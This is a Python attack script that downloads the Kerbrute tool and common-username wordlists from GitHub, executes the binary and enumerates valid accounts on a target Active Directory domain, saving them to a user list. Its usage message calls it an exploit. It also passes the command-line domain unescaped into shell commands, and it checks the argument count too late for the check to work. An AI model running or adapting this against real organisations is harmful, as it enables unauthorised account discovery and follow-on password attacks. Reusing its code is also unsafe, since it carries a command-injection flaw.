#!/bin/python3 

import sys
from colorama import Fore, Back, Style 
import subprocess 
import os 



# Define Banner
def printBanner():
	print (Fore.YELLOW + """
  _____                 _                                                   
  \_   \_ ____   _____ | | _____        /\ /\___ _ __ _ __  _   _ _ __ ___  
   / /\/ '_ \ \ / / _ \| |/ / _ \_____ / //_/ _ \ '__| '_ \| | | | '_ ` _ \ 
/\/ /_ | | | \ V / (_) |   <  __/_____/ __ \  __/ |  | | | | |_| | | | | | |
\____/ |_| |_|\_/ \___/|_|\_\___|     \/  \/\___|_|  |_| |_|\__,_|_| |_| |_|
	""")
print(Style.RESET_ALL)


def downloadKerbrute():
	print(Fore.GREEN + "Hold on tight! Downloading Kerbrute and Userlists\n")
	print(Style.RESET_ALL)
	kerbrute_url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"
	userlists = ["https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/john.smith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jjsmith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/johnsmith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt","https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/service-accounts.txt"]
	os.system('wget ' + kerbrute_url)
	os.system('chmod +x kerbrute_linux_amd64')
	for x in userlists:
		os.system('wget ' + x)

def invokeKerbrute():
#for each line in the file it will be used as a parameter for kerbrute 
	os.system('for file in $(ls | grep txt); do echo $file >> file_list.txt; done')
	print(Fore.GREEN + "Executing kerbrute username enumeration against: " + domain)
	print(Style.RESET_ALL)
	with open("file_list.txt") as file_in:
    		lines = []
    		for line in file_in:
        		lines.append(line)
	for l in lines:
		print("\nAttacking: " + domain + " using " + l)
		os.system('./kerbrute_linux_amd64 userenum -d ' + domain + ' ' + l + '>> valid_users.txt' )

def invokeFormat():
	os.system("""cat valid_users.txt | cut -d "      " -f2 > valid_users2.txt""")
	os.system("""cat valid_users2.txt | tr -d "[:blank:]" > valid_users3.txt""")
	print(Fore.RED + "\nCheck userlist and remove faulty users!")
	print(Style.RESET_ALL)
	os.system("cat valid_users3.txt" +  " |  cut -f1 -d" + "@" + " | tee userlist")
printBanner() 
print(Style.RESET_ALL)

#Arguments
domain = sys.argv[1]

if len(sys.argv) != 2:
    print("Please enter a valid domain to run the script")
    print("Format: exploit.py domain.local")
    sys.exit(5)
	
downloadKerbrute()
invokeKerbrute()
invokeFormat()
